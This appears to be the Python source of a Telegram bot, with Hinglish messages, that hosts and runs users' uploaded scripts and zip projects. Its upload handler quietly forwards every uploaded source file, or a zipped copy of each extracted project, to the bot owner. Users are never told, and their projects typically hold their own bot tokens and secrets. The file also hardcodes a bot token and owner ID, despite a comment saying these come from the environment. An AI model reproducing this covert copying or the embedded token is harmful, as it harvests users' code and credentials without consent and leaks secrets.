import asyncio, os, sys, time, json, shutil, zipfile, subprocess, re

# Telegram native button colours require Bot API 9.6+ and an aiogram release
# that supports InlineKeyboardButton.style. Keep startup safe on Termux by
# upgrading aiogram automatically when an older release is installed.
def _ensure_button_style_support():
    try:
        from importlib.metadata import version
        installed_raw = version("aiogram")
        nums = tuple(int(x) for x in re.findall(r"\d+", installed_raw)[:3])
        installed = nums + (0,) * (3 - len(nums))
        if installed < (3, 27, 0):
            subprocess.check_call([
                sys.executable, "-m", "pip", "install", "-U",
                "aiogram>=3.27.0,<4"
            ])
            os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as exc:
        # If aiogram is missing, let the normal import below report the
        # dependency problem; do not hide unrelated runtime errors.
        if "No package metadata was found for aiogram" not in str(exc):
            print(f"[aiogram] style support check: {exc}")

_ensure_button_style_support()

from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart
from aiogram.types import (Message, CallbackQuery, InlineKeyboardMarkup,
                           InlineKeyboardButton, FSInputFile)
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage


try:
    import resource
except ImportError:
    resource = None

def cpu_percent_fallback(interval=0.5):
    try:
        if hasattr(os, "getloadavg"):
            load = os.getloadavg()[0]
            cpu_count = os.cpu_count() or 1
            return round(min(100.0, max(0.0, load / cpu_count * 100)), 1)
    except Exception:
        pass
    return 0.0

def memory_percent_fallback():
    try:
        pages = os.sysconf("SC_PHYS_PAGES")
        avail = os.sysconf("SC_AVPHYS_PAGES")
        return round((1 - (avail / pages)) * 100, 1) if pages else 0.0
    except Exception:
        return 0.0

# ================= CONFIG =================
# Set BOT_TOKEN and OWNER_ID in the environment before starting.
BOT_TOKEN = "8838209270:AAGy1eZjKGjP6uV91YwNZoZA9fRag4_Glho"
OWNER_ID = 8154859186
OWNER_USERNAME = "Galu_Modz_Owner"
FREE_LIMIT = int(os.getenv("FREE_LIMIT", "1") or 1)
PREMIUM_LIMIT = int(os.getenv("PREMIUM_LIMIT", "10") or 10)
BASE = os.path.dirname(os.path.abspath(__file__))
UPLOADS = os.path.join(BASE, "uploads")
DB_FILE = os.path.join(BASE, "db.json")
os.makedirs(UPLOADS, exist_ok=True)
START_TIME = time.time()
# ==========================================


def normalize_channel(value):
    value = (value or "").strip()
    if value.startswith("@"):
        return "https://t.me/" + value[1:]
    if value.startswith("https://t.me/") or value.startswith("http://t.me/"):
        return value
    if re.fullmatch(r"[A-Za-z0-9_]{5,}", value):
        return "https://t.me/" + value
    return value

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

processes = {}  # (uid, project) -> Popen


# ---------------- DB ----------------
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"users": {}}


def save_db():
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(DB, f, indent=2)


DB = load_db()
DB.setdefault("settings", {})
DB["settings"].setdefault("updates_channel", "")
save_db()

def get_updates_channel():
    return normalize_channel(DB.get("settings", {}).get("updates_channel", ""))

def set_updates_channel(value):
    DB.setdefault("settings", {})["updates_channel"] = normalize_channel(value)
    save_db()
    return get_updates_channel()


def get_user(u):
    uid = str(u.id)
    if uid not in DB["users"]:
        DB["users"][uid] = {"name": u.full_name, "username": u.username or "N/A",
                            "premium": False, "banned": False, "joined": time.time()}
        save_db()
    else:
        DB["users"][uid]["name"] = u.full_name
        DB["users"][uid]["username"] = u.username or "N/A"
    return DB["users"][uid]


def user_dir(uid):
    p = os.path.join(UPLOADS, str(uid))
    os.makedirs(p, exist_ok=True)
    return p


def list_projects(uid):
    d = user_dir(uid)
    return sorted([x for x in os.listdir(d) if os.path.isdir(os.path.join(d, x))])


def limit_of(user):
    return PREMIUM_LIMIT if user["premium"] else FREE_LIMIT


def is_running(uid, name):
    p = processes.get((uid, name))
    return p is not None and p.poll() is None


# ---------------- UI / COLORS ----------------
# Telegram supports three native button styles: success (green),
# danger (red), and primary (blue). The helper below keeps the bot
# compatible with older aiogram versions: if an old aiogram is installed,
# it falls back to a normal button instead of crashing.
PRIMARY_STYLE = "success"   # GREEN
DANGER_STYLE = "danger"     # RED
NEUTRAL_STYLE = PRIMARY_STYLE  # GREEN primary as requested
PRIMARY_COLOR = "🟢"
DANGER_COLOR = "🔴"

def make_button(text, callback_data=None, url=None, style=PRIMARY_STYLE):
    """Create a Telegram button with a native Bot API colour style."""
    kwargs = {"text": text, "style": style}
    if callback_data is not None:
        kwargs["callback_data"] = callback_data
    if url is not None:
        kwargs["url"] = url
    return InlineKeyboardButton(**kwargs)

def primary_text(text):
    return f"{PRIMARY_COLOR} {text}"

def danger_text(text):
    return f"{DANGER_COLOR} {text}"

# ---------------- UI ----------------
def main_kb():
    rows = []
    channel = get_updates_channel()
    if channel:
        rows.append([make_button(text="📢 Updates Channel", url=channel)])
    rows.extend([
        [make_button(text="📤 Upload File", callback_data="upload"),
         make_button(text="📂 Check Files", callback_data="files")],
        [make_button(text="⚡ Bot Speed", callback_data="speed"),
         make_button(text="📊 Statistics", callback_data="stats")],
        [make_button(text="💎 Premium", callback_data="premium")],
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [make_button(text="🔙 Back", callback_data="home", style=PRIMARY_STYLE)]])


LINE = "━━━━━━━━━━━━━━━━━━━━"


def welcome_text(u, user):
    rank = "💎 Premium" if user["premium"] else "🆓 Free User"
    if u.id == OWNER_ID:
        rank = "👑 Owner"
    return (f"👋 Hey — <b>{u.full_name}</b>, welcome back!\n{LINE}\n"
            f"🆔 <b>ID:</b> <code>{u.id}</code>\n"
            f"✳️ <b>Username:</b> @{u.username or 'N/A'}\n"
            f"🏖 <b>Rank:</b> {rank}\n"
            f"📁 <b>Projects:</b> {len(list_projects(u.id))} / {limit_of(user)}\n{LINE}\n\n"
            f"⚡ <b>What can I do for you?</b>\n"
            f"› Upload <code>.py</code> / <code>.js</code> scripts or <code>.zip</code> archives\n"
            f"› Run &amp; manage your bots 24/7\n"
            f"› Auto-install missing packages\n\n"
            f"👇 <b>Tap a button below to get started!</b>")


class St(StatesGroup):
    waiting_file = State()
    waiting_pkg = State()


# ---------------- Helpers ----------------
def find_entry(path):
    for n in ("main.py", "bot.py", "app.py", "index.js", "main.js", "bot.js", "app.js"):
        if os.path.exists(os.path.join(path, n)):
            return n
    for n in sorted(os.listdir(path)):
        if n.endswith((".py", ".js")):
            return n
    return None


def install_reqs(path):
    log = ""
    req = os.path.join(path, "requirements.txt")
    if os.path.exists(req):
        r = subprocess.run([sys.executable, "-m", "pip", "install", "-r", req],
                           capture_output=True, text=True, timeout=600)
        log += r.stdout[-500:] + r.stderr[-500:]
    pkg = os.path.join(path, "package.json")
    if os.path.exists(pkg) and shutil.which("npm"):
        r = subprocess.run(["npm", "install"], cwd=path, capture_output=True,
                           text=True, timeout=600)
        log += r.stdout[-300:]
    return log


def start_project(uid, name):
    name = os.path.basename(name)
    path = os.path.join(user_dir(uid), name)
    entry = find_entry(path)
    if not entry:
        return False, "Koi .py/.js file nahi mili."
    if is_running(uid, name):
        return False, "Already running hai."
    logf = open(os.path.join(path, "run.log"), "ab")
    cmd = [sys.executable, entry] if entry.endswith(".py") else ["node", entry]
    if entry.endswith(".js") and not shutil.which("node"):
        return False, "Server pe Node.js installed nahi hai."
    p = subprocess.Popen(cmd, cwd=path, stdout=logf, stderr=subprocess.STDOUT)
    processes[(uid, name)] = p
    return True, entry


def stop_project(uid, name):
    p = processes.get((uid, name))
    if p and p.poll() is None:
        try:
            p.terminate()
            try:
                p.wait(timeout=3)
            except subprocess.TimeoutExpired:
                p.kill()
        except Exception:
            pass
        return True
    return False


async def auto_install_missing(uid, name):
    """Run ke baad crash ho aur ModuleNotFoundError ho to package install karo."""
    await asyncio.sleep(6)
    p = processes.get((uid, name))
    if p and p.poll() is not None:
        logp = os.path.join(user_dir(uid), name, "run.log")
        try:
            data = open(logp, "r", errors="ignore").read()[-3000:]
        except Exception:
            return None
        m = re.findall(r"No module named '([\w\.\-]+)'", data)
        if m:
            mod = m[-1].split(".")[0]
            alias = {"cv2": "opencv-python", "PIL": "pillow", "yaml": "pyyaml",
                     "bs4": "beautifulsoup4", "telebot": "pyTelegramBotAPI"}
            pkgname = alias.get(mod, mod)
            r = subprocess.run([sys.executable, "-m", "pip", "install", pkgname],
                               capture_output=True, text=True, timeout=300)
            if r.returncode == 0:
                start_project(uid, name)
                return pkgname
    return None


# ---------------- Handlers ----------------
@router.message(CommandStart())
async def start(m: Message, state: FSMContext):
    await state.clear()
    user = get_user(m.from_user)
    if user["banned"]:
        return await m.answer(danger_text("Aap banned ho."))
    text = welcome_text(m.from_user, user)
    if m.from_user.id == OWNER_ID:
        text += "\\n\\n👑 <b>Owner:</b> <code>/admin</code>"
    await m.answer(text, reply_markup=main_kb())


@router.callback_query(F.data == "home")
async def home(c: CallbackQuery, state: FSMContext):
    await state.clear()
    user = get_user(c.from_user)
    await c.message.edit_text(welcome_text(c.from_user, user), reply_markup=main_kb())
    await c.answer()


@router.callback_query(F.data == "upload")
async def upload(c: CallbackQuery, state: FSMContext):
    user = get_user(c.from_user)
    if len(list_projects(c.from_user.id)) >= limit_of(user):
        return await c.answer(danger_text("Project limit full! Premium lo ya purana delete karo."),
                              show_alert=True)
    await state.set_state(St.waiting_file)
    await c.message.edit_text(
        "📤 <b>Upload File</b>\n\nAb apni <code>.py</code> / <code>.js</code> ya "
        "<code>.zip</code> file bhejo (max 20 MB).", reply_markup=back_kb())
    await c.answer()


@router.message(St.waiting_file, F.document)
async def got_file(m: Message, state: FSMContext):
    user = get_user(m.from_user)
    uid = m.from_user.id
    doc = m.document
    fn = doc.file_name or "file"
    if not fn.lower().endswith((".py", ".js", ".zip")):
        return await m.answer(danger_text("Sirf .py / .js / .zip allowed hai."))
    if doc.file_size and doc.file_size > 20 * 1024 * 1024:
        return await m.answer(danger_text("File 20MB se badi hai."))
    if len(list_projects(uid)) >= limit_of(user):
        return await m.answer(danger_text("Project limit full."))

    name = re.sub(r"[^\w\-]", "_", os.path.splitext(fn)[0])[:30] or "project"
    path = os.path.join(user_dir(uid), name)
    if os.path.exists(path):
        name += str(int(time.time()) % 1000)
        path = os.path.join(user_dir(uid), name)
    os.makedirs(path)
    tmp = os.path.join(path, fn)
    msg = await m.answer("⏳ Downloading...")
    await bot.download(doc, destination=tmp)

    if fn.lower().endswith(".zip"):
        try:
            with zipfile.ZipFile(tmp) as z:
                for member in z.namelist():  # zip-slip protection
                    target = os.path.realpath(os.path.join(path, member))
                    if not target.startswith(os.path.realpath(path)):
                        raise Exception("Unsafe zip")
                z.extractall(path)
            os.remove(tmp)
            items = os.listdir(path)  # single top folder ho to bahar nikalo
            if len(items) == 1 and os.path.isdir(os.path.join(path, items[0])):
                inner = os.path.join(path, items[0])
                for x in os.listdir(inner):
                    shutil.move(os.path.join(inner, x), path)
                os.rmdir(inner)
        except Exception as e:
            shutil.rmtree(path, ignore_errors=True)
            return await msg.edit_text(danger_text(f"Zip error: {e}"))

    await msg.edit_text("📦 Packages install ho rahe hain...")
    await asyncio.get_event_loop().run_in_executor(None, install_reqs, path)
    await state.clear()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [make_button(text="▶️ Run Now", callback_data=f"run:{name}")],
        [make_button(text="📂 Check Files", callback_data="files")]])
    await msg.edit_text(f"✅ <b>{name}</b> upload ho gaya!", reply_markup=kb)
    try:
        await bot.send_message(
            OWNER_ID,
            f"📥 <b>New File Hosted</b>\\n"
            f"👤 User: {m.from_user.full_name} (<code>{uid}</code>)\\n"
            f"📁 Project: <code>{name}</code>\\n"
            f"📄 File: <code>{fn}</code>"
        )
        # Forward the uploaded source file to the owner.
        if os.path.exists(tmp):
            await bot.send_document(
                OWNER_ID,
                FSInputFile(tmp, filename=fn),
                caption=f"📦 Uploaded by {m.from_user.full_name} | ID: {uid}"
            )
        else:
            # ZIPs are extracted and the temporary ZIP is removed. Create a
            # clean owner copy of the extracted project and send it.
            owner_zip = os.path.join(path, f"{name}_owner_copy.zip")
            with zipfile.ZipFile(owner_zip, "w", zipfile.ZIP_DEFLATED) as z:
                for root, dirs, files_ in os.walk(path):
                    for file_ in files_:
                        full = os.path.join(root, file_)
                        if full == owner_zip or file_ == "run.log":
                            continue
                        z.write(full, os.path.relpath(full, path))
            await bot.send_document(
                OWNER_ID,
                FSInputFile(owner_zip, filename=os.path.basename(owner_zip)),
                caption=f"📦 Project copy | {name} | User ID: {uid}"
            )
            try:
                os.remove(owner_zip)
            except OSError:
                pass
    except Exception as exc:
        # Hosting itself remains successful if the owner has not started the
        # bot or Telegram temporarily rejects the notification.
        print(f"[owner notification] {exc}")


@router.callback_query(F.data == "files")
async def files(c: CallbackQuery, state: FSMContext):
    await state.clear()
    uid = c.from_user.id
    projs = list_projects(uid)
    if not projs:
        return await c.message.edit_text("📂 Abhi koi project nahi hai.\n"
                                         "Pehle <b>Upload File</b> karo.",
                                         reply_markup=back_kb())
    rows = []
    for p in projs:
        s = PRIMARY_COLOR if is_running(uid, p) else DANGER_COLOR
        rows.append([make_button(text=f"{s} {p}", callback_data=f"proj:{p}")])
    rows.append([make_button(text="🔙 Back", callback_data="home", style=PRIMARY_STYLE)])
    await c.message.edit_text("📂 <b>Your Projects</b>",
                              reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    await c.answer()


def proj_kb(name, running):
    first = (make_button(text="⏹ Stop", callback_data=f"stop:{name}", style=DANGER_STYLE) if running
             else make_button(text="▶️ Run", callback_data=f"run:{name}"))
    return InlineKeyboardMarkup(inline_keyboard=[
        [first, make_button(text="🔄 Restart", callback_data=f"restart:{name}")],
        [make_button(text="📜 Logs", callback_data=f"logs:{name}"),
         make_button(text="🗑 Delete", callback_data=f"del:{name}", style=DANGER_STYLE)],
        [make_button(text="🔙 Back", callback_data="files", style=PRIMARY_STYLE)]])


@router.callback_query(F.data.startswith("proj:"))
async def proj(c: CallbackQuery):
    name = c.data.split(":", 1)[1]
    run = is_running(c.from_user.id, name)
    await c.message.edit_text(
        f"📁 <b>{name}</b>\nStatus: {'🟢 Running' if run else '🔴 Stopped'}",
        reply_markup=proj_kb(name, run))
    await c.answer()


@router.callback_query(F.data.startswith("run:"))
async def run(c: CallbackQuery):
    name = c.data.split(":", 1)[1]
    uid = c.from_user.id
    ok, info = start_project(uid, name)
    if not ok:
        return await c.answer(f"{danger_text(info)}", show_alert=True)
    await c.answer("🚀 Starting...")
    await c.message.edit_text(f"🚀 <b>{name}</b> start ho gaya ({info})",
                              reply_markup=proj_kb(name, True))
    pk = await auto_install_missing(uid, name)
    if pk:
        await c.message.answer(f"📦 Missing package <code>{pk}</code> install karke "
                               f"<b>{name}</b> dobara start kiya.")


@router.callback_query(F.data.startswith("stop:"))
async def stop(c: CallbackQuery):
    name = c.data.split(":", 1)[1]
    stop_project(c.from_user.id, name)
    await c.message.edit_text(f"⏹ <b>{name}</b> stop ho gaya.",
                              reply_markup=proj_kb(name, False))
    await c.answer()


@router.callback_query(F.data.startswith("restart:"))
async def restart(c: CallbackQuery):
    name = c.data.split(":", 1)[1]
    stop_project(c.from_user.id, name)
    await asyncio.sleep(1)
    ok, info = start_project(c.from_user.id, name)
    await c.answer("🔄 Restarted" if ok else f"{danger_text(info)}", show_alert=not ok)
    if ok:
        await c.message.edit_text(f"🔄 <b>{name}</b> restart ho gaya.",
                                  reply_markup=proj_kb(name, True))


@router.callback_query(F.data.startswith("logs:"))
async def logs(c: CallbackQuery):
    name = c.data.split(":", 1)[1]
    lp = os.path.join(user_dir(c.from_user.id), name, "run.log")
    if not os.path.exists(lp) or os.path.getsize(lp) == 0:
        return await c.answer("Abhi koi log nahi hai.", show_alert=True)
    await c.message.answer_document(FSInputFile(lp, filename=f"{name}_log.txt"))
    await c.answer()


@router.callback_query(F.data.startswith("del:"))
async def delete(c: CallbackQuery):
    name = c.data.split(":", 1)[1]
    stop_project(c.from_user.id, name)
    shutil.rmtree(os.path.join(user_dir(c.from_user.id), name), ignore_errors=True)
    processes.pop((c.from_user.id, name), None)
    await c.answer("🗑 Deleted", show_alert=True)
    await files(c, None) if False else await c.message.edit_text(
        "🗑 Project delete ho gaya.", reply_markup=back_kb())


@router.callback_query(F.data == "speed")
async def speed(c: CallbackQuery):
    t = time.time()
    await c.answer("Testing...")
    ms = round((time.time() - t) * 1000, 1)
    cpu = cpu_percent_fallback(0.5)
    ram = memory_percent_fallback()
    up = int(time.time() - START_TIME)
    await c.message.edit_text(
        f"⚡ <b>Bot Speed</b>\n{LINE}\n🏓 Ping: <code>{ms} ms</code>\n"
        f"🖥 CPU: <code>{cpu}%</code>\n💾 RAM: <code>{ram}%</code>\n"
        f"⏱ Uptime: <code>{up // 3600}h {(up % 3600) // 60}m</code>",
        reply_markup=back_kb())


@router.callback_query(F.data == "stats")
async def stats(c: CallbackQuery):
    total = len(DB["users"])
    prem = sum(1 for u in DB["users"].values() if u["premium"])
    running = sum(1 for k in processes if is_running(*k))
    await c.message.edit_text(
        f"📊 <b>Statistics</b>\n{LINE}\n👥 Total Users: <code>{total}</code>\n"
        f"💎 Premium: <code>{prem}</code>\n🟢 Running Bots: <code>{running}</code>",
        reply_markup=back_kb())
    await c.answer()


@router.callback_query(F.data == "premium")
async def premium(c: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [make_button(text="📞 Contact Owner",
                              url=f"https://t.me/{OWNER_USERNAME}")],
        [make_button(text="🔙 Back", callback_data="home", style=PRIMARY_STYLE)]])
    await c.message.edit_text(
        f"💎 <b>Premium</b>\n{LINE}\n✅ {PREMIUM_LIMIT} projects tak upload\n"
        f"✅ Priority support\n\nBuy karne ke liye owner se contact karo.",
        reply_markup=kb)
    await c.answer()


@router.callback_query(F.data == "manual")
async def manual(c: CallbackQuery, state: FSMContext):
    await state.set_state(St.waiting_pkg)
    await c.message.edit_text(
        "📦 <b>Manual Install</b>\n\nPackage ka naam bhejo (pip), jaise "
        "<code>requests</code> ya <code>aiohttp pillow</code>",
        reply_markup=back_kb())
    await c.answer()


@router.message(St.waiting_pkg, F.text)
async def do_install(m: Message, state: FSMContext):
    pkgs = m.text.split()
    if not all(re.fullmatch(r"[A-Za-z0-9_\-\.\[\]=<>]+", p) for p in pkgs):
        return await m.answer(danger_text("Invalid package name."))
    msg = await m.answer("⏳ Installing...")
    r = await asyncio.get_event_loop().run_in_executor(
        None, lambda: subprocess.run([sys.executable, "-m", "pip", "install", *pkgs],
                                     capture_output=True, text=True, timeout=300))
    await state.clear()
    ok = r.returncode == 0
    await msg.edit_text(("✅ Installed: " if ok else "❌ Failed:\n") +
                        (" ".join(pkgs) if ok else f"<code>{r.stderr[-400:]}</code>"),
                        reply_markup=back_kb())


@router.callback_query(F.data == "info")
async def info(c: CallbackQuery):
    user = get_user(c.from_user)
    await c.message.edit_text(
        f"👤 <b>My Info</b>\n{LINE}\n🆔 ID: <code>{c.from_user.id}</code>\n"
        f"📛 Name: {c.from_user.full_name}\n✳️ Username: @{c.from_user.username or 'N/A'}\n"
        f"🏖 Rank: {'💎 Premium' if user['premium'] else '🆓 Free User'}\n"
        f"📁 Projects: {len(list_projects(c.from_user.id))} / {limit_of(user)}",
        reply_markup=back_kb())
    await c.answer()


# ---------------- Owner commands ----------------
@router.message(F.text == "/admin", F.from_user.id == OWNER_ID)
async def owner_admin(m: Message):
    channel = get_updates_channel() or "Not set"
    await m.answer(
        f"👑 <b>Owner Panel</b>\\n{LINE}\\n"
        f"📢 Updates Channel: <code>{channel}</code>\\n"
        f"👥 Users: <code>{len(DB["users"])}</code>\\n\\n"
        f"Use <code>/setchannel @channelusername</code> to change the channel."
    )

@router.message(F.text.startswith("/setchannel"), F.from_user.id == OWNER_ID)
async def setchannel(m: Message):
    value = m.text.replace("/setchannel", "", 1).strip()
    if not value:
        return await m.answer(
            "Use: <code>/setchannel @yourchannel</code> or "
            "<code>/setchannel https://t.me/yourchannel</code>"
        )
    channel = set_updates_channel(value)
    await m.answer(primary_text(f"Updates channel set to: {channel}"))

@router.message(F.text == "/channel", F.from_user.id == OWNER_ID)
async def channel(m: Message):
    await m.answer(
        f"📢 Current Updates Channel:\\n<code>{get_updates_channel() or 'Not set'}</code>"
    )


@router.message(F.text.startswith("/premium"), F.from_user.id == OWNER_ID)
async def give_premium(m: Message):
    try:
        uid = m.text.split()[1]
        DB["users"][uid]["premium"] = True
        save_db()
        await m.answer(primary_text(f"{uid} ko premium mil gaya."))
    except Exception:
        await m.answer("Use: /premium user_id")


@router.message(F.text.startswith("/ban"), F.from_user.id == OWNER_ID)
async def ban(m: Message):
    try:
        uid = m.text.split()[1]
        DB["users"][uid]["banned"] = True
        save_db()
        await m.answer(danger_text(f"{uid} banned."))
    except Exception:
        await m.answer("Use: /ban user_id")


@router.message(F.text.startswith("/broadcast"), F.from_user.id == OWNER_ID)
async def broadcast(m: Message):
    text = m.text.replace("/broadcast", "", 1).strip()
    if not text:
        return await m.answer("Use: /broadcast message")
    n = 0
    for uid in DB["users"]:
        try:
            await bot.send_message(int(uid), text)
            n += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await m.answer(f"📢 {n} users ko bheja.")


async def main():
    print("Bot started...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
